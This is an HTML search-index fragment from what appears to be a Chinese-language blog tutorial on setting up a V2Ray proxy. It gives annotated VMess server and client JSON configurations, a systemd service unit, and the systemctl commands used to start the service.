    <content type="html"><![CDATA[<h1 id="v2ray配置"><a href="#v2ray配置" class="headerlink" title="v2ray配置"></a>v2ray配置</h1><h3 id="1-v2ray服务器"><a href="#1-v2ray服务器" class="headerlink" title="1.v2ray服务器"></a>1.v2ray服务器</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <br>    <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10086</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 服务器监听端口，必须和上面的一样</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;vmess&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//协议</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;clients&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-comment">//客户端</span><br>                <span class="hljs-punctuation">[</span> <br>                    <span class="hljs-punctuation">&#123;</span> <br>                        <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//用户的唯一标识</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//用户等级,默认为0一般用于配置用户的相关使用限制</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>        <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <br>    <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <br>            <span class="hljs-punctuation">&#123;</span><br>                <br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-v2ray客户端"><a href="#2-v2ray客户端" class="headerlink" title="2.v2ray客户端"></a>2.v2ray客户端</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <br>    <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1080</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// SOCKS 代理端口，在浏览器中需配置代理并指向这个端口</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//绑定的端口</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">//代理协议</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-comment">//探测,根据所指定的协议类型重置目标,可以解决dns污染问题,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <br>                <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span> <br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <br>            <span class="hljs-punctuation">&#123;</span><br>              <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">//是否开启udp代理</span><br>              <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span>    <span class="hljs-comment">//是否开启验证</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1081</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// http 代理端口，在浏览器中需配置代理并指向这个端口</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//绑定的地址</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//代理协议</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <br>            <span class="hljs-punctuation">&#123;</span><br>              <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span><br>              <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <br>    <span class="hljs-punctuation">[</span><br>         <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;vmess&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;vnext&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-comment">//可以配置多个实现负载均衡</span><br>                <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;server&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 服务器地址，请修改为你自己的服务器 ip 或域名</span><br>                        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10086</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 服务器端口</span><br>                        <span class="hljs-attr">&quot;users&quot;</span><span class="hljs-punctuation">:</span>                <span class="hljs-comment">//用户</span><br>                        <span class="hljs-punctuation">[</span><br>                            <span class="hljs-punctuation">&#123;</span> <br>                                <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//和服务端设置一样</span><br>                                <span class="hljs-attr">&quot;alterId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>     <span class="hljs-comment">//在 v4.28.1 版本之后必须设置为 0 以启用 VMessAEAD </span><br>                                <span class="hljs-attr">&quot;security&quot;</span><span class="hljs-punctuation">:</span> auto <span class="hljs-comment">//设置安全性</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">]</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>         <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>         <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;direct&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <br>             <span class="hljs-punctuation">&#123;</span><br>                    <br>                <span class="hljs-punctuation">&#125;</span><br>         <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;routing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;domainStrategy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;IPOnDemand&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;rules&quot;</span><span class="hljs-punctuation">:</span> <br>      <span class="hljs-punctuation">[</span><br>          <span class="hljs-punctuation">&#123;</span><br>              <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>              <span class="hljs-attr">&quot;ip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;geoip:private&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>              <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;direct&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>      <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="3-配置服务端service文件"><a href="#3-配置服务端service文件" class="headerlink" title="3.配置服务端service文件"></a>3.配置服务端service文件</h3><p>v2ray.service</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[Unit]<br>Description=V2Ray Service<br>Documentation=https://www.v2fly.org/<br>After=network.target nss-lookup.target<br><br>[Service]<br>User=nobody<br>NoNewPrivileges=<span class="hljs-literal">true</span><br>ExecStart=/usr/local/bin/v2ray run -config /usr/local/etc/v2ray/config.json<br>Restart=on-failure<br>RestartPreventExitStatus=23<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl daemon-reload<br>systemctl restart v2ray.service<br></code></pre></td></tr></table></figure><h3 id="4-启动v2ray服务"><a href="#4-启动v2ray服务" class="headerlink" title="4.启动v2ray服务"></a>4.启动v2ray服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl start v2ray.service<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
